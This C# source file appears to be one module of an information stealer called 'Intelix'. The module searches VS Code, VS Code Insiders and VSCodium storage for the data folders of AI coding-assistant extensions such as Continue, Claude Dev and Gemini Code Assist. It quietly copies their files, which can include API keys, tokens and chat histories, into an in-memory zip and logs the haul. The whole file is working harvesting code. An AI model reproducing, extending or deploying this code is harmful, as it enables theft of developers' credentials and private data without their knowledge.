using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class VSCodeAIExtensions : ITarget
    {
        private static readonly string[] AiExtensionIds = {
            "continue.continue",
            "rooveterinaryinc.roo-cline",
            "saoudrizwan.claude-dev",
            "anysphere.pyright",
            "ms-vscode.vscode-ai",
            "visualstudioexptteam.vscodeintellicode",
            "visualstudioexptteam.intellicode-api-usage-examples",
            "google.geminicodeassist",
            "amazonwebservices.codewhisperer-for-command-line-companion"
        };

        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] vscodeDirs = { "Code", "Code - Insiders", "VSCodium" };
            var entry = new Counter.CounterApplications { Name = "VSCode AI Extensions" };
            foreach (string vscodeDir in vscodeDirs)
            {
                string globalStorage = Path.Combine(appdata, vscodeDir, "User", "globalStorage");
                if (!Directory.Exists(globalStorage)) continue;
                foreach (string extId in AiExtensionIds)
                {
                    string extDir = Path.Combine(globalStorage, extId);
                    if (!Directory.Exists(extDir)) continue;
                    foreach (string file in Directory.GetFiles(extDir, "*", SearchOption.AllDirectories))
                    {
                        if (new FileInfo(file).Length > 1 * 1024 * 1024) continue;
                        try
                        {
                            string rel = "AI-Agent\\VSCodeExtensions\\" + extId + "\\" + Path.GetFileName(file);
                            zip.AddFile(rel, File.ReadAllBytes(file));
                            entry.Files.Add(file + " => " + rel);
                        }
                        catch { }
                    }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
